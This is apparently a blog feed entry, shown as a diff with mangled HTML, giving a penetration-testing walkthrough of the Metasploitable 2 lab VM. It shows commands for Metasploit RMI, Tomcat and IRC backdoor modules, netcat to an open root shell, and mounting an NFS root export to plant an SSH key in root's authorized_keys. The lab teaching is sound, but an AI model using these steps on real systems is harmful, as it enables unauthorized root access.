+</span><span class='line'><span class="s2">&lt;h2&gt;RMI Registry Exploit&lt;/h2&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">&lt;p&gt;&lt;p&gt;After some break, we analyzed the nmap result along with some google results , we came to know that the remote</span>
+</span><span class='line'><span class="s2">machine runs &lt;strong&gt;&lt;em&gt;&lt;code&gt;rmiregistry&lt;/code&gt;&lt;/em&gt;&lt;/strong&gt; on port &lt;strong&gt;&lt;em&gt;1099&lt;/em&gt;&lt;/strong&gt; was found to be vulnerable. We exploited the same using metasploit &lt;code&gt;java_rmi_server&lt;/code&gt; module</span>
+</span><span class='line'><span class="s2">to gain root access to the remote system.&lt;p/&gt;&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">&lt;p&gt;<img class="&lt;a href=&quot;</span><span class=ss>http</span><span class=p>:</span><span class=sr>//i</span><span class=o>.</span><span class=n>imgur</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>sqhjAFy</span><span class=o>.</span><span class=n>png</span><span" src="class="s2">&quot;&gt;http://i.imgur.com/sqhjAFy.png&lt;/a&gt;">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">&lt;h2&gt;Root Access&lt;/h2&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">&lt;p&gt;&lt;p&gt; The remote system was running up with a service named &lt;code&gt;shell&lt;/code&gt;  on port &lt;code&gt;1524&lt;/code&gt;, we made a &lt;code&gt;Netcat&lt;/code&gt; connection to the port and wow!</span>
+</span><span class='line'><span class="s2">i was not prompted with any user name and password for entering. Directly i was able to access the root shell.&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">&lt;p&gt;<img class="&lt;a href=&quot;</span><span class=ss>http</span><span class=p>:</span><span class=sr>//i</span><span class=o>.</span><span class=n>imgur</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>igj2yb8</span><span class=o>.</span><span class=n>png</span><span" src="class="s2">&quot;&gt;http://i.imgur.com/igj2yb8.png&lt;/a&gt;">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">&lt;h2&gt;SSH through NFS&lt;/h2&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">&lt;p&gt;Network File system &lt;code&gt;[NFS]&lt;/code&gt; was found to be open on Port &lt;code&gt;2049&lt;/code&gt; where RPC was also found to be open on port &lt;code&gt;111&lt;/code&gt;. So we made a &lt;code&gt;rpcinfo&lt;/code&gt; to identify NFS</span>
+</span><span class='line'><span class="s2">and &lt;code&gt;showmount&lt;/code&gt; to identify the mountpoint to export a local file to remote system.</span>
+</span><span class='line'><span class="s2">&lt;code&gt;ruby Rpcinfo</span>
+</span><span class='line'><span class="s2">root@Hacker:~# rpcinfo -p 192.168.2.7</span>
+</span><span class='line'><span class="s2">   program vers proto   port  service</span>
+</span><span class='line'><span class="s2">    100000    2   tcp    111  portmapper</span>
+</span><span class='line'><span class="s2">    100000    2   udp    111  portmapper</span>
+</span><span class='line'><span class="s2">    100024    1   udp  47286  status</span>
+</span><span class='line'><span class="s2">    100024    1   tcp  43411  status</span>
+</span><span class='line'><span class="s2">    100003    2   udp   2049  nfs</span>
+</span><span class='line'><span class="s2">    100003    3   udp   2049  nfs</span>
+</span><span class='line'><span class="s2">    100003    4   udp   2049  nfs</span>
+</span><span class='line'><span class="s2">    100021    1   udp  58082  nlockmgr</span>
+</span><span class='line'><span class="s2">    100021    3   udp  58082  nlockmgr</span>
+</span><span class='line'><span class="s2">    100021    4   udp  58082  nlockmgr</span>
+</span><span class='line'><span class="s2">    100003    2   tcp   2049  nfs</span>
+</span><span class='line'><span class="s2">    100003    3   tcp   2049  nfs</span>
+</span><span class='line'><span class="s2">    100003    4   tcp   2049  nfs</span>
+</span><span class='line'><span class="s2">    100021    1   tcp  51154  nlockmgr</span>
+</span><span class='line'><span class="s2">    100021    3   tcp  51154  nlockmgr</span>
+</span><span class='line'><span class="s2">    100021    4   tcp  51154  nlockmgr</span>
+</span><span class='line'><span class="s2">    100005    1   udp  47566  mountd</span>
+</span><span class='line'><span class="s2">    100005    1   tcp  44007  mountd</span>
+</span><span class='line'><span class="s2">    100005    2   udp  47566  mountd</span>
+</span><span class='line'><span class="s2">    100005    2   tcp  44007  mountd</span>
+</span><span class='line'><span class="s2">    100005    3   udp  47566  mountd</span>
+</span><span class='line'><span class="s2">    100005    3   tcp  44007  mountd</span>
+</span><span class='line'><span class="s2">&lt;/code&gt;</span>
+</span><span class='line'><span class="s2">&lt;p&gt; Rpcinfo shows the NFS is open.&lt;p/&gt;&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">&lt;pre&gt;&lt;code class=&quot;</span><span class="n">ruby</span> <span class="no">Showmount</span><span class="s2">&quot;&gt;root@Hacker:~# showmount -e 192.168.2.7</span>
+</span><span class='line'><span class="s2">Export list for 192.168.2.7:</span>
+</span><span class='line'><span class="s2">/ *</span>
+</span><span class='line'><span class="s2">&lt;/code&gt;&lt;/pre&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">&lt;p&gt;&lt;p&gt; using showmount -e we found that the &amp;ldquo;/&amp;rdquo; share (the root of the file system) is being exported.By making use of</span>
+</span><span class='line'><span class="s2">this share we started to access the system with a writeable filesystem.&lt;p/&gt;&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s2">&lt;p&gt;&lt;p&gt;Based on nmap result we found that &lt;code&gt;SSH&lt;/code&gt; service was running on port &lt;code&gt;22&lt;/code&gt;, So we started to generate a new SSH key on our attacking system,</span>
+</span><span class='line'><span class="s2">Later we created a new directory for mounting to the NFS export and add our key to the root user account&amp;rsquo;s authorized_keys file.&lt;p/&gt;</span>
+</span></code></pre></td></tr></table></div></figure> ruby SSH keygen
+root@Hacker:~# ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa):
+/root/.ssh/id_rsa already exists.
+Overwrite (y/n)? y
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in /root/.ssh/id_rsa.
+Your public key has been saved in /root/.ssh/id_rsa.pub.
+The key fingerprint is:
+9d:69:ed:f6:c8:fd:55:e7:e6:de:9b:d8:18:b3:48:18 root@Hacker
+The key&rsquo;s randomart image is:
++&ndash;[ RSA 2048]&mdash;-+
+|                 |
+|                 |
+|                 |
+|         . +     |
+|        SE= .   o|
+|         .o.   .o|
+|         . .oo  +|
+|          .o.+Bo+|
+|           .o+o**|
++&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+&mdash;>create a directory anywere for mounting purpose</p>
+
+<p>root@Hacker:~# mkdir /tmp/dsm
+root@Hacker:~# mount -t nfs 192.168.2.7:/ /tmp/dsm/ -o nolock</p>
+
+<p>&mdash;>copying our ssh to the remote root folder through mount share
+root@Hacker:~# cat ~/.ssh/id_rsa.pub >> /tmp/dsm/root/.ssh/authorized_keys</p>
+
+<p>&mdash;> Finally Do the ssh
+root@Hacker:~# ssh <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#114;&#111;&#111;&#x74;&#x40;&#49;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#50;&#x2e;&#55;">&#x72;&#x6f;&#111;&#x74;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#50;&#46;&#55;</a>
+Last login: Sun Aug 24 22:33:44 2014 from :0.0
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686</p>
+
+<p>The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.</p>
+
+<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.</p>
+
+<p>To access official Ubuntu documentation, please visit:
+<a href="http://help.ubuntu.com/">http://help.ubuntu.com/</a>
+You have new mail.
+root@metasploitable:~# id;uname -a;
+uid=0(root) gid=0(root) groups=0(root)
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+root@metasploitable:~#</p>
+
+<pre><code>##Backdoors
+#### UnrealIRCD Backdoor
+&lt;p&gt;The remote machine was running a UnreaIRCD IRC daemon. Later we found that this version contains a backdoor that can be triggered 
+by sending the letters "AB" following by a system command to the server on any listening port.&lt;p/&gt; 
+&lt;p&gt;Metasploit has a module to exploit this in order to gain an interactive shell, as shown below.&lt;p/&gt;
+
+<img src="http://i.imgur.com/sJXmibS.png">
+
+
+##Backdoor by Nature
+&lt;p&gt;Distccd is a free distributed c/c++ compiler runs on port `3632`, which was found to be vunerable for a backoor. 
+The problem with this service is that any user can easily abuse it to run a command of their choice to gain a interactive shell. 
+We achieved a interactive shell via the metasploit module, as shown below&lt;p/&gt;
+
+<img src="http://i.imgur.com/svGBRIE.png">
+
+##Remote Code execution
+&lt;p&gt; The `drb` service running on port `8787` was vulnerable to  remote code execution. We exploited this vulnerability using the 
+metasploit module which is coded below&lt;p/&gt;
+
+<img src="http://i.imgur.com/RFNiuju.png">
+
+##Web Backdoor
+&lt;p&gt;For a while we were exploiting the vulnerabilities only on network side, and we didnt even exploit any of the web services.
+So we now decided do a web backoor and were looing for a suitable service to do so. By doing a quick scan through our human eyes into the nmap
+results we found a `Apache tomcat` service running on port `8180`. The following page will appear if you browse this port with the 
+target ip&lt;p /&gt;
+
+
+<img src="http://i.imgur.com/cbHaPwG.png">
+
+&lt;p&gt;Take a look at the webpage, you could see a Administration column containing:&lt;p /&gt;
+1. status
+2. Tomcat administration
+3. Tomcat manager
+
+&lt;p&gt;we just made a click on one of the link, suddenly a Authentication page appears saying enter the `UserName` and `Password`. when we got this
+we thougt that we could not exploit the page. But its not the case, we decided to do a search in metasploit about tomcat to find any 
+modules for exploiting and we got a list of modules. Then we decided to run the specific auxiliary modules which would result you the
+username and password of the tomcat administrator. The metasploit auxiliary module is shown below.&lt;p/&gt;
+</code></pre>
+
+<p>auxiliary/admin/http/tomcat_administration
+<code>
+&lt;p&gt;After a while the scan was complete and we got the username and passowrd for tomcat administration whihc is shown below&lt;p/&gt;
+</code> ruby Tomcat_administration
+msf > use auxiliary/admin/http/tomcat_administration
+msf auxiliary(tomcat_administration) > set RHOSTS 192.168.2.7
+RHOSTS => 192.168.2.7
+msf auxiliary(tomcat_administration) > run</p>
+
+<p>[*] <a href="http://192.168.2.7:8180/admin">http://192.168.2.7:8180/admin</a> [Apache-Coyote/1.1] [Apache Tomcat/5.5] [Tomcat Server Administration] [tomcat/tomcat]
+&#8220;`
+<p>Now we could make use of this tomcat username and password to gain a interactive shell using the below metasploit module<p/></p>
+
+<p><img class="<a" src="href="http://i.imgur.com/tzP9aaf.png">http://i.imgur.com/tzP9aaf.png</a>&#8221;></p>
+
+<p><p>Finaly we got out shell!!!!!.<p/></p>
+
+<p><strong><em>*Game Over</em></strong></p>
+
+<p><p> Its Time to endup this Pentesting Roadmap of Metasploitable 2. <strong><em>Game Over Guys</em></strong>. Stay tuned each weekend i will get back with
+different VM&rsquo;s with different ways of Getting the Flag.<p/></p>
+]]></content>
+  </entry>
+  
+</feed>
